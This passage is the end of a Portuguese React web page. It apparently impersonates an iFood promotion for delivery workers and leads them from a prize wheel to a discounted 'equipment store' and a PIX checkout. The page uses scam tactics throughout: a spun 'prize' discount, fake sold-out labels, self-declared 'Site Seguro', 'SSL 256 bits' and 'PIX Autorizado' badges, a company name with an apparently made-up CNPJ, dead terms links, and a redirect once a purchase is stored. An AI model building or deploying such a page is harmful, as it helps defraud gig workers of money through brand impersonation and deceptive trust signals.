                            <h2 className="text-lg font-black text-gray-800 mb-3 leading-tight uppercase">Equipamentos certos para quem vive de entrega</h2>
                            <p className="text-sm text-gray-600 leading-relaxed font-medium">
                                Aqui você encontra equipamentos voltados para quem trabalha com entregas urbanas pela plataforma do iFood, com condição promocional liberada para você que é entregador(a).<br/><br/>
                                <strong className="text-gray-800">Todos os produtos disponíveis abaixo já estão com o desconto aplicado.</strong>
                            </p>
                        </div>

                        <div className="flex gap-4 overflow-x-auto pb-4 mb-2 mt-6 hide-scrollbar">
                            {CATEGORIES.map(cat => (
                                <button key={cat.id} onClick={() => { playSound('click'); setActiveCategory(cat.id); }} className={`flex flex-col items-center min-w-[64px] gap-1.5 transition-all ${activeCategory === cat.id ? 'scale-105 opacity-100' : 'opacity-60 grayscale'}`}>
                                    <div className={`w-14 h-14 rounded-2xl flex items-center justify-center border-2 shadow-sm ${activeCategory === cat.id ? 'bg-[#EA1D2C] border-[#EA1D2C] text-white shadow-red-500/20' : 'bg-white border-gray-200 text-gray-500'}`}>
                                        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">{cat.icon}</svg>
                                    </div>
                                    <span className={`text-[9px] font-black uppercase tracking-wider ${activeCategory === cat.id ? 'text-[#EA1D2C]' : 'text-gray-600'}`}>{cat.label}</span>
                                </button>
                            ))}
                        </div>

                        <div className="flex items-center justify-between mb-4 mt-6">
                            <h2 className="text-sm font-black text-gray-800 uppercase tracking-widest flex items-center gap-2">
                                <span className="w-1.5 h-4 bg-[#EA1D2C] rounded-full"></span>
                                {activeCategory === 'home' ? 'Itens em Destaque' : 'Catálogo'}
                            </h2>
                            {activeCategory === 'home' && (
                                <span onClick={() => { playSound('click'); setActiveCategory('all'); }} className="text-[10px] text-[#EA1D2C] font-black uppercase tracking-widest flex items-center cursor-pointer">
                                    Ver tudo<svg className="h-3 w-3 ml-1" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M9 5l7 7-7 7" /></svg>
                                </span>
                            )}
                        </div>

                        <div className="grid grid-cols-2 gap-3 pb-8">
                            {filteredProducts.map(product => {
                                const price = calculatePrice(product.originalPrice, discount);
                                const [int, dec] = price.split('.');

                                return (
                                    <div key={product.id} className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden flex flex-col active:scale-95 transition-transform text-left">
                                        <div className="relative aspect-square bg-white p-3 flex items-center justify-center">
                                            <img src={product.image} className={`max-w-full max-h-full object-contain mix-blend-multiply ${product.stockLeft === 0 ? 'opacity-40 grayscale' : ''}`} />
                                            {product.stockLeft > 0 && <div className="absolute top-2 right-2 bg-[#EA1D2C] text-white text-[9px] font-black px-2 py-1 rounded-md shadow-sm">-{Math.floor(discount * 100)}%</div>}
                                            {product.stockLeft === 0 && (
                                                <div className="absolute inset-0 flex items-center justify-center">
                                                    <span className="bg-black/70 text-white font-black text-xs px-4 py-1.5 rounded-lg -rotate-12 border border-gray-600 backdrop-blur-sm shadow-xl uppercase tracking-widest">Esgotado</span>
                                                </div>
                                            )}
                                        </div>
                                        <div className="p-3 flex-1 flex flex-col justify-between border-t border-gray-50 bg-gray-50/30">
                                            <div>
                                                <h3 className={`text-[10px] text-gray-800 font-black uppercase tracking-tight leading-snug mb-2 line-clamp-2 h-[2.5em] ${product.stockLeft === 0 ? 'opacity-50' : ''}`}>{product.name}</h3>
                                                <div className={`flex flex-col mb-3 mt-1 ${product.stockLeft === 0 ? 'opacity-50' : ''}`}>
                                                    <span className="text-[9px] text-gray-400 font-bold line-through">R$ {product.originalPrice.toFixed(2).replace('.', ',')}</span>
                                                    <div className="flex items-baseline gap-0.5 text-[#EA1D2C]">
                                                        <span className="text-[10px] font-black">R$</span>
                                                        <span className="text-xl font-black leading-none tracking-tighter">{int}</span>
                                                        <span className="text-[10px] font-black">,{dec}</span>
                                                    </div>
                                                </div>
                                            </div>
                                            {product.stockLeft > 0 ? (
                                                <button onClick={() => { playSound('click'); onSelectProduct(product); }} className="w-full bg-[#EA1D2C] hover:bg-red-700 text-white text-[10px] font-black uppercase tracking-widest py-2.5 rounded-xl shadow-[0_4px_12px_rgba(234,29,44,0.2)] flex items-center justify-center">
                                                    RESGATAR
                                                </button>
                                            ) : (
                                                <button disabled className="w-full bg-gray-200 text-gray-400 text-[10px] font-black uppercase tracking-widest py-2.5 rounded-xl cursor-not-allowed border border-gray-300">
                                                    INDISPONÍVEL
                                                </button>
                                            )}
                                        </div>
                                    </div>
                                );
                            })}
                        </div>

                        <div className="bg-white p-6 rounded-2xl shadow-sm border border-gray-100 mb-6 mt-2 text-left">
                             <h2 className="text-sm font-black text-gray-800 mb-3 uppercase tracking-wide flex items-center gap-2">
                                 <svg className="w-5 h-5 text-green-500" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
                                 Compra segura
                             </h2>
                             <p className="text-[11px] text-gray-600 font-medium leading-relaxed">
                                 Após a confirmação do pagamento, seu pedido é separado e enviado para faturamento.<br/><br/>
                                 O envio é realizado em até 24h úteis após a confirmação.<br/><br/>
                                 Prazo médio de entrega: 3 a 7 dias úteis, dependendo da região.<br/><br/>
                                 Você recebe o código de acompanhamento após o envio.
                             </p>
                        </div>
                        
                        <FAQAccordion />

                    </div>
                </div>
            );
        };

        const App = () => {
            const [view, setView] = React.useState(() => {
                if (safeGetLocal('entregador_active_pix')) return 'checkout';
                if (safeGetLocal('entregador_award_data')) return 'store';
                return 'prequal';
            });
            
            const [wonPrize, setWonPrize] = React.useState(() => safeGetLocal('entregador_award_data'));
            const [showPrizeModal, setShowPrizeModal] = React.useState(false);
            const [selectedProduct, setSelectedProduct] = React.useState(() => safeGetLocal('entregador_selected_product'));

            React.useEffect(() => {
                try { if (localStorage.getItem('entregador_purchase_completed')) { window.location.href = REDIRECT_URL; } } catch (e) {}
                const loader = document.getElementById('initial-loader');
                if (loader) loader.style.display = 'none';
            }, []);

            React.useEffect(() => {
                if (wonPrize && (view === 'prequal' || view === 'wheel')) {
                    setView('store');
                }
            }, [view, wonPrize]);

            const handleWheelFinish = (prize) => {
                setWonPrize(prize);
                safeSetLocal('entregador_award_data', prize);
                setTimeout(() => { setShowPrizeModal(true); }, 800);
            };

            const handleRedeem = () => {
                setShowPrizeModal(false);
                setView('store');
                window.scrollTo(0,0);
            };

            const handleSelectProduct = (product) => {
                setSelectedProduct(product);
                setView('checkout');
                window.scrollTo(0,0);
            };

            return (
                <div className="min-h-screen bg-[#f8f9fa] flex flex-col font-sans">
                    {(view === 'store' || view === 'checkout') && <Navbar />}
                    {(view === 'store' || view === 'checkout') && <NotificationToast />}
                    
                    <main className="flex-grow flex flex-col">
                        {view === 'prequal' && <PreQualification onComplete={() => setView('wheel')} />}
                        {view === 'wheel' && <Wheel onFinish={handleWheelFinish} />}
                        {view === 'store' && <Store discount={wonPrize ? wonPrize.value : 0.70} onSelectProduct={handleSelectProduct} />}
                        {view === 'checkout' && selectedProduct && <Checkout product={selectedProduct} discount={wonPrize ? wonPrize.value : 0.70} onBack={() => setView('store')} initialPix={safeGetLocal('entregador_active_pix')} />}
                    </main>

                    <PrizeRevealModal show={showPrizeModal} prize={wonPrize} onRedeem={handleRedeem} />
                    
                    {(view === 'store' || view === 'checkout' || view === 'prequal') && (
                        <footer className="bg-[#111827] text-gray-400 py-10 px-6 text-center mt-auto">
                            <div className="flex justify-center gap-6 mb-8">
                                <div className="flex flex-col items-center gap-2 opacity-70">
                                    <div className="w-10 h-10 rounded-full bg-gray-800 flex items-center justify-center">
                                        <svg className="w-5 h-5 text-green-400" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" /></svg>
                                    </div>
                                    <span className="text-[9px] uppercase font-black tracking-widest text-gray-300">Site Seguro</span>
                                </div>
                                <div className="flex flex-col items-center gap-2 opacity-70">
                                    <div className="w-10 h-10 rounded-full bg-gray-800 flex items-center justify-center">
                                        <svg className="w-5 h-5 text-green-400" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
                                    </div>
                                    <span className="text-[9px] uppercase font-black tracking-widest text-gray-300">SSL 256 bits</span>
                                </div>
                                <div className="flex flex-col items-center gap-2 opacity-70">
                                    <div className="w-10 h-10 rounded-full bg-gray-800 flex items-center justify-center">
                                        <svg className="w-5 h-5 text-[#10B981]" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                                    </div>
                                    <span className="text-[9px] uppercase font-black tracking-widest text-gray-300">PIX Autorizado</span>
                                </div>
                            </div>
                            
                            <div className="space-y-2 mb-6 opacity-60 text-left px-4">
                                <p className="text-[10px] font-bold text-gray-500">CLUBE DO ENTREGADOR BRASIL LTDA</p>
                                <p className="text-[9px] text-gray-500">CNPJ: 45.123.456/0001-00</p>
                                <p className="text-[9px] text-gray-500">Av. Paulista, 1000 - Bela Vista, São Paulo - SP</p>
                            </div>

                            <div className="flex justify-center gap-4 text-[9px] font-black text-gray-500 uppercase tracking-widest mb-6 border-t border-gray-800 pt-6">
                                <a href="#" className="hover:text-gray-300">Termos de Uso</a>
                                <span>•</span>
                                <a href="#" className="hover:text-gray-300">Política de Privacidade</a>
                            </div>
                            <p className="text-[9px] uppercase tracking-widest font-black opacity-30">© 2024 Portal de Incentivo. Todos os direitos reservados.</p>
                        </footer>
                    )}
                </div>
            );
        };

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<ErrorBoundary><App /></ErrorBoundary>);
    </script>
</body>
</html>
